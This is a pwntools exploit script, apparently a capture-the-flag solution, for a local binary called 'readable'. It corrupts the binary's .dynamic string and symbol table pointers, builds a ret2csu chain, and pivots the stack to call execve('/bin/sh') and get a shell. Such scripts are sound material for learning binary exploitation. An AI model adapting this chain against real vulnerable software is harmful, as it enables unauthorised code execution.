from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p   = process('./readable')
elf = ELF('./readable')


dl          = 0x400280
STRTAB      = 0x600778
SYMTAB      = 0x600788
csu_part1   = 0x400570
csu_part2   = 0x400586
leave_ret   = 0x400520
stack       = 0x600000 + 0x700
bss_addr    = elf.bss()
tmp_stack   = bss_addr + 0x30
read_offset = 0xB


def csu(fun, edi, rsi, rdx):
    payload = p64(csu_part2)
    payload += p64(0)       # add     rsp, 8
    payload += p64(0)       # rbx
    payload += p64(1)       # rbp
    payload += p64(fun)     # r12
    payload += p64(rdx)     # r13
    payload += p64(rsi)     # r14
    payload += p64(edi)     # r15
    payload += p64(csu_part1)
    payload += p64(0)       #  * 7
    return payload


def read16byte(addr, text):
    payload  = b'a' * 0x10
    payload += p64(addr + 0x10) # 伪造旧栈帧
    payload += p64(0x400505)    # 读取
    p.send(payload)
    payload = text.ljust(0x10, b'\x00') # 写入text
    payload += p64(tmp_stack)    # 新的栈帧
    payload += p64(0x400505)
    p.send(payload)


# 修改.dynamic
read16byte(STRTAB, p64(5) + p64(bss_addr - read_offset))
read16byte(SYMTAB, p64(6) + p64(dl))

# bss段写入binsh和execve
read16byte(bss_addr, b'execve\x00/bin/sh\x00')

# 用csu调用read
payload = csu(elf.got['read'], bss_addr + 7, 0, 0)

# 构建新的栈
read16byte(stack, p64(0) + p64(0x4003E6))
for i in range(5):
    read16byte(stack + (i+1) * 0x10, payload[i * 0x10 : (i + 1) * 0x10])

# 栈迁移
payload  = b'a' * 0x10
payload += p64(stack)
payload += p64(leave_ret)
p.send(payload)

p.interactive()